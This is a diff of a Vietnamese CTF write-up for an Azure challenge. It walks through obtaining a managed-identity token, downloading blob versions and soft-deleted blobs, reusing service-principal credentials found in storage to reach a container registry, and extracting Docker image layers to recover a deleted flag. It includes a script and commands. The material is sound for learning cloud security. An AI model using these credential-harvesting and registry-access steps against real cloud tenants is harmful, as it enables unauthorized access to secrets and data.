@@ -1,4 +1,4 @@
-## Hunter
+## Hunter - Minh SA (CIMB)
 
 ### 1. Login Azure with Service Principal
 - Quăng cái JSON của BTC cho Copilot hỏi làm sao login thì được chỉ
@@ -132,8 +132,8 @@ wget -qO- --header="X-IDENTITY-HEADER: 5557107a-b00b-4a7c-84df-3670932d1b39" "ht
 ```
 
 ### 4. Get flags from Azure Storage with checking versions and soft-deleted
-- Dù hỏi Copilot và thử hết cách nhưng mình chỉ có nửa cái flag và một số cred thôi: **DF25{d4e9e6814f***
-- Script để tải hết flag phía dưới (nhớ set cái ACCESS_TOKEN vô env):
+- Dù hỏi Copilot và thử hết cách nhưng chỉ có nửa cái flag và một số cred thôi: **DF25{d4e9e6814f**
+- Thế là kêu Copilot cho cái script để tải hết file về:
 ```
 #!/bin/bash
 
@@ -178,4 +178,142 @@ done < blob_versions.txt
 echo "[✓] All downloads complete. Files saved in: $OUTPUT_DIR"
 ```
 
+### 5. Access Azure Container Registry
+- Trong blob storage có nhiều credentials khá tương tự
+```
+[
+  {
+    "appId": "4834ae62-2b8d-431a-bce7-55593eff32d7",
+    "displayName": "tung-acr",
+    "password": [hidden]",
+    "tenant": "f86939d1-b472-486f-83e9-b0a4b3fa6fec"
+  }
+]
+```
+- Thử login với credential thì thấy có thể access được Azure Container Registry
+- Get hết list image từ registry sau đó pull về máy
+```
+> docker image ls | grep qr
+acrqrwebllptbcbf.azurecr.io/hello-world                                  latest             107641799b9c   2 days ago      127MB
+acrqrwebllptbcbf.azurecr.io/devenv                                       yarn               5ee371df200b   2 days ago      139MB
+acrqrwebllptbcbf.azurecr.io/devenv                                       typescript         710560e28d29   2 days ago      192MB
+acrqrwebllptbcbf.azurecr.io/devenv                                       node2              03cc47de6bf0   2 days ago      194MB
+acrqrwebllptbcbf.azurecr.io/devenv                                       node               edc4ccb1f2a9   2 days ago      131MB
+acrqrwebllptbcbf.azurecr.io/node                                         alpine             dd60588f548f   12 days ago     168MB
+acrqrwebllptbcbf.azurecr.io/qrzure                                       latest             56c2519a6171   2 weeks ago     189MB
+acrqrwebllptbcbf.azurecr.io/test/hello-world                             latest             1b44b5a3e06a   6 weeks ago     10.1kB
+```
+
+### 6. Get rest of flag from layers of Docker image
+- Nghi ngờ content của image có flag nên run docker run exec để check nhưng không có kết quả
+```
+docker run -it acrqrwebllptbcbf.azurecr.io/hello-world cat flag
+docker run -it acrqrwebllptbcbf.azurecr.io/hello-world /bin/bash
+```
+
+- Inspect từng layer của image thì thấy có step add flag xong xoá (chạy trong script)
+```
+> dive acrqrwebllptbcbf.azurecr.io/hello-world
+Cmp   Size  Command                                                                                    drwxr-xr-x         0:0     809 kB  ├── bin
+    7.8 MB  FROM blobs                                                                                 -rwxrwxrwx         0:0        0 B  │   ├── arch → /bin/busybox
+    114 MB  RUN /bin/sh -c addgroup -g 1000 node     && adduser -u 1000 -G node -s /bin/sh -D node     -rwxrwxrwx         0:0        0 B  │   ├── ash → /bin/busybox
+    5.4 MB  RUN /bin/sh -c apk add --no-cache --virtual .build-deps-yarn curl gnupg tar   && export GN -rwxrwxrwx         0:0        0 B  │   ├── base64 → /bin/busybox
+     388 B  COPY docker-entrypoint.sh /usr/local/bin/ # buildkit                                       -rwxrwxrwx         0:0        0 B  │   ├── bbconfig → /bin/busybox
+       0 B  WORKDIR /app                                                                               -rwxr-xr-x         0:0     809 kB  │   ├── busybox
+      27 B  COPY app.js . # buildkit                                                                   -rwxrwxrwx         0:0        0 B  │   ├── cat → /bin/busybox
+      11 B  COPY flag . # buildkit                                                                     -rwxrwxrwx         0:0        0 B  │   ├── chattr → /bin/busybox
+     569 B  COPY entrypoint.sh . # buildkit                                                            -rwxrwxrwx         0:0        0 B  │   ├── chgrp → /bin/busybox
+       0 B  RUN /bin/sh -c rm -rf ./flag && echo "Try to read me" # buildkit                           -rwxrwxrwx         0:0        0 B  │   ├── chmod → /bin/busybox
+     569 B  RUN /bin/sh -c chmod +x entrypoint.sh # buildkit
+```
+
+- Save từng image ra file tar để extract từng layer và cat ra 
+```
+docker save acrqrwebllptbcbf.azurecr.io/hello-world:latest -o image.tar
+```
+
+- Loop each layer and find flag
+```
+#!/bin/bash
+
+# Script to extract and inspect Docker image layers to find the 'flag' file or CTF flag
+# Usage: ./find_flag.sh <image.tar>
+# Requires: tar, jq, grep, strings (standard Linux tools)
+
+# Check if image.tar is provided as an argument
+if [ $# -ne 1 ]; then
+    echo "Usage: $0 <image.tar>"
+    exit 1
+fi
+
+IMAGE_TAR="$1"
+
+# Check if the image tarball exists
+if [ ! -f "$IMAGE_TAR" ]; then
+    echo "Error: $IMAGE_TAR does not exist"
+    exit 1
+fi
+
+# Create a working directory
+WORK_DIR="image_layers_$(date +%s)"
+mkdir -p "$WORK_DIR"
+cd "$WORK_DIR" || exit 1
+
+# Extract the image tarball
+echo "Extracting $IMAGE_TAR..."
+tar -xvf "../$IMAGE_TAR" || { echo "Failed to extract $IMAGE_TAR"; exit 1; }
+
+# Check for manifest.json
+if [ ! -f "manifest.json" ]; then
+    echo "Error: manifest.json not found in $IMAGE_TAR"
+    exit 1
+fi
+
+# Parse layers from manifest.json using jq
+echo "Listing layers from manifest.json..."
+LAYERS=$(jq -r '.[0].Layers[]' manifest.json)
+if [ -z "$LAYERS" ]; then
+    echo "Error: No layers found in manifest.json"
+    exit 1
+fi
+
+# Iterate through each layer
+echo "Inspecting layers for 'flag' file or CTF flag..."
+for LAYER in $LAYERS; do
+    LAYER_DIR=$(echo "$LAYER" | cut -d'/' -f1)
+    echo "Processing layer: $LAYER"
+
+    # Extract the layer tarball
+    if [ -f "$LAYER" ]; then
+        mkdir -p "extracted_$LAYER_DIR"
+        tar -xvf "$LAYER" -C "extracted_$LAYER_DIR" 2>/dev/null || { echo "Failed to extract $LAYER"; continue; }
+
+        # Search for 'flag' file
+        FLAG_FILE=$(find "extracted_$LAYER_DIR" -type f -name "flag")
+        if [ -n "$FLAG_FILE" ]; then
+            echo "Found flag file: $FLAG_FILE"
+            cat "$FLAG_FILE"
+        fi
+
+        # Search for CTF flag string in all files
+        CTF_FLAG=$(find "extracted_$LAYER_DIR" -type f -exec strings {} \; | grep -E "CTF{.*}")
+        if [ -n "$CTF_FLAG" ]; then
+            echo "Found CTF flag in layer $LAYER_DIR: $CTF_FLAG"
+        fi
+    else
+        echo "Warning: Layer $LAYER not found"
+    fi
+done
+
+# Clean up (optional, comment out to keep extracted files for manual inspection)
+# echo "Cleaning up..."
+# cd .. && rm -rf "$WORK_DIR"
+
+echo "Done. If no flag was found, try inspecting layers manually in $WORK_DIR"
+
+```
+
+- Ta có phần còn lại của flag: 6ea2c94c3e
+
+## DF25{d4e9e6814f6ea2c94c3e}
 ## Thanks CBJS!
